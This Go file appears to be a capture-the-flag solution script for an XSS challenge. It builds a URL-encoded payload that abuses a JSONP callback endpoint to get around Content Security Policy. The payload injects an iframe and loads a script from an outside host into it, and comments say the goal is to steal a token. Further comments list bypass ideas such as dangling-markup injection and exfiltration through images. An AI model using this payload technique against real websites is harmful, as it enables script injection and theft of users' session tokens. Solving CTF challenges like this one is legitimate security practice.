package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

const base = "http://xss.allesctf.net/"

var re = regexp.MustCompile(`<b>"(.*)"</b> konnte nicht gefunden werden 🙁🙁🙁`)

// bypass CSP by injecting iframe and loading script into it after it loads
var script = strings.Trim(`
	var d = document;
	var	i=d.createElement('iframe');
	i.src='//xss.allesctf.net/x';
	d.body.appendChild(i);
	i.onload=function(){
		var cd=i.contentDocument,
			s=cd.createElement('script');
		s.src='//cimi.io/2012-politicians/ctf-5.js?v=1';
		cd.body.appendChild(s)
	};
`, "\n\t ")

var mScript2 = `var d=document,i=d.createElement('iframe');i.src='//xss.allesctf.net/x';d.body.appendChild(i);i.onload=function(){var cd=i.contentDocument,s=cd.createElement('script');s.src='//cimi.io/2012-politicians/ctf-5.js?v=1';cd.body.appendChild(s)};`

// on stage2.* setcookie domain is invalid for PHPSESSID, it references parent domain

// inject iframe and execute JS in that context
// X-Frame-Deny not included on error pages
// CSP not included for static resources
// XSS on the search page with CSP bypass through jsonp response

// steal token by loading script in iframe
// send opaque post request to set bg to something using JS
// tried eating the nonce, couldn't escape ">
// tried using iframes or style tags to include content
// could load images to exfiltrate data, \n prevented it though

// dangling injection attack
// <input type="hidden" id="bg" value="$inject">\n<script nonce="A5zucGuloXyIHpPZtlsf0/uXmqw=">

func main() {
	inputs := []string{
		// "<em>test</em>",
		// "<script>alert('test');</script>",
		// "<script>console.log('test');</script>",
		fmt.Sprintf(`<script src="http://xss.allesctf.net/items.php?cb=%s"></script>Boom!`, mScript2),
	}
	for _, input := range inputs {
		query := "?search=" + url.QueryEscape(input)
		fmt.Println(base + query)
		continue
		// rsp, err := http.Get(base + query)
		// checkErr(err)

		// matches := re.FindStringSubmatch(parseResponse(rsp))
		// fmt.Println(parseResponse(rsp))
		// fmt.Println(input, matches[1], base+query)
	}
}

// http://xss.allesctf.net/items.php?cb=parseItems
// http://xss.allesctf.net/items.php?cb=alert(1);parseItems

func minify(script string) string {
	lines := strings.Split(script, "\n")
	result := ""
	for _, l := range lines {
		result += strings.Trim(l, "\n\t ")
	}
	return result
}

func parseResponse(rsp *http.Response) string {
	bytes, err := ioutil.ReadAll(rsp.Body)
	checkErr(err)
	return string(bytes)
}

func checkErr(err error) {
	if err != nil {
		panic(err)
	}
}
